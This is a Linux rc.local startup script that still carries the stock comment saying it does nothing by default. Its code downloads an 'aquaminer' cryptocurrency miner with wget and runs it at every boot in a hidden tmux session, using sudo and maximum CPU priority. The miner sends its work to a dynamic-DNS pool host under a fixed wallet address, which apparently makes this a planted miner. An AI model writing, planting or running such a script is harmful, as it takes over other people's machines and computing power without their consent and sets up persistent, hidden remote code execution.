#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/aquaminer-0.3.2-linux-amd64 ]; then
    if pgrep -x "aquaminer-0.3.2" > /dev/null
then
    echo "minerd is running"
else

echo "minerd has been installed, starting now"
	
tmux new-session -d -s my_session1 './aquaminer-0.3.2-linux-amd64 -F http://traugia.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/3'

     
fi
exit
fi

wget https://github.com/aquanetwork/aquachain/releases/download/aquaminer-v0.3.2/aquaminer-0.3.2-linux-amd64.zip
unzip aquaminer-0.3.2-linux-amd64.zip
tmux new-session -d -s my_session1 'sudo nice -n -20 ./aquaminer-0.3.2-linux-amd64 -F http://traugia.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/3'

exit 0
